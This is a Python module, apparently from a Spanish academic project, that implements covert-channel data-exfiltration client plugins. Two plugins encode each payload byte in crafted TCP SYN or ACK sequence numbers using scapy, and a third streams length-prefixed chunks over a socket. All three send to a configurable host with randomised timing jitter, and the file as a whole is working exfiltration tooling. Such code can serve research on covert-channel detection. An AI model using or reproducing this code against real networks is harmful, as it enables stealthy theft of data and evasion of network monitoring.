from __future__ import annotations
from typing import Dict, Any, Iterable, Optional
import time, random
import socket, struct

from tfg.plugins.api import ExfilClientPlugin
from .tcp_common import build_header_bytes, EOT, SEQ_BASE, iter_bytes_from_chunks

def _sleep_rhythm(base_ms: int, disp_ms: int) -> None:
    if base_ms or disp_ms:
        jitter = random.uniform(-disp_ms, disp_ms)
        t = max(0.0, (base_ms + jitter) / 1000.0)
        time.sleep(t)

def _send_packet(pkt, iface: Optional[str] = None):
    from scapy.all import send, sendp, Ether, conf, getmacbyip
    if not iface:
        send(pkt, verbose=False)
        return

    old_iface = conf.iface
    try:
        conf.iface = iface
        mac = getmacbyip(pkt.dst)
    finally:
        conf.iface = old_iface

    if not mac:
        raise RuntimeError(f"no se pudo resolver MAC para destino {pkt.dst!r} en iface {iface!r}")
    sendp(Ether(dst=mac) / pkt, verbose=False, iface=iface)


def _send_syn(dst, dport, b: int, iface: Optional[str] = None):
    from scapy.all import IP, TCP, RandShort
    pkt = IP(dst=dst)/TCP(dport=int(dport), sport=RandShort(), flags='S', seq=SEQ_BASE + (b & 0xFF))
    _send_packet(pkt, iface=iface)

def _send_ack(dst, dport, b: int, iface: Optional[str] = None):
    from scapy.all import IP, TCP, RandShort
    pkt = IP(dst=dst)/TCP(dport=int(dport), sport=RandShort(), flags='A', seq=SEQ_BASE + (b & 0xFF), ack=1)
    _send_packet(pkt, iface=iface)

class TcpClientSynAck(ExfilClientPlugin):
    canal = "TCP"
    metodo = 1  # SYN-ACK
    name = "tcp_client_synack"

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        host = config.get("host") or "127.0.0.1"
        port = int(config.get("port") or 9001)
        exfil_id = config.get("exfil_id") or str(int(time.time()*1000))
        auth_token = config.get("auth_token")
        ritmo_base = int(config.get("ritmo_base_ms") or 0)
        ritmo_disp = int(config.get("ritmo_dispersion_ms") or 0)
        iface = config.get("iface")

        header = build_header_bytes(exfil_id, auth_token)
        sent = 0
        for b in header:
            _send_syn(host, port, b, iface=iface); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
        for b in iter_bytes_from_chunks(payload_iter):
            _send_syn(host, port, b, iface=iface); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
        _send_syn(host, port, EOT, iface=iface); sent += 1
        return {"ok": True, "plugin": self.name, "exfil_id": exfil_id, "sent_symbols": sent}

class TcpClientSeq(ExfilClientPlugin):
    canal = "TCP"
    metodo = 2  # SEQUENCE NUMBER
    name = "tcp_client_seq"

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        host = config.get("host") or "127.0.0.1"
        port = int(config.get("port") or 9002)
        exfil_id = config.get("exfil_id") or str(int(time.time()*1000))
        auth_token = config.get("auth_token")
        ritmo_base = int(config.get("ritmo_base_ms") or 0)
        ritmo_disp = int(config.get("ritmo_dispersion_ms") or 0)
        iface = config.get("iface")

        header = build_header_bytes(exfil_id, auth_token)
        sent = 0
        for b in header:
            _send_ack(host, port, b, iface=iface); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
        for b in iter_bytes_from_chunks(payload_iter):
            _send_ack(host, port, b, iface=iface); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
        _send_ack(host, port, EOT, iface=iface); sent += 1
        return {"ok": True, "plugin": self.name, "exfil_id": exfil_id, "sent_symbols": sent}

class TcpClientLength(ExfilClientPlugin):
    canal = "TCP"
    metodo = 3  # LENGTH
    name = "tcp_client_length"

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        host = config.get("host") or config.get("bind_host") or "127.0.0.1"
        port = int(config.get("port") or config.get("bind_port") or 9000)
        exfil_id = config.get("exfil_id") or str(int(time.time()*1000))
        auth_token = config.get("auth_token")
        ritmo_base = int(config.get("ritmo_base_ms") or 0)
        ritmo_disp = int(config.get("ritmo_dispersion_ms") or 0)
        timeout_s = int(config.get("timeout_s") or 10)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout_s)
        s.connect((host, port))
        try:
            pre = b"TFG/1\n" + (b"AUTH " + auth_token.encode() + b"\n" if auth_token else b"") + b"ID " + exfil_id.encode() + b"\nMODE LENGTH\n\n"
            s.sendall(pre)
            code = s.recv(4)
            if not code.startswith(b"200"):
                raise RuntimeError(f"servidor rechazo la sesion: {code!r}")
            sent_bytes = 0
            sent_frags = 0
            for chunk in payload_iter:
                if ritmo_base or ritmo_disp:
                    jitter = random.uniform(-ritmo_disp, ritmo_disp)
                    time.sleep(max(0.0, (ritmo_base + jitter)/1000.0))
                s.sendall(struct.pack("!I", len(chunk)))
                if chunk:
                    s.sendall(chunk)
                    sent_bytes += len(chunk)
                    sent_frags += 1
            s.sendall(struct.pack("!I", 0))
            return {"ok": True, "plugin": self.name, "exfil_id": exfil_id, "sent_bytes": sent_bytes, "sent_fragments": sent_frags}
        finally:
            try: s.close()
            except: pass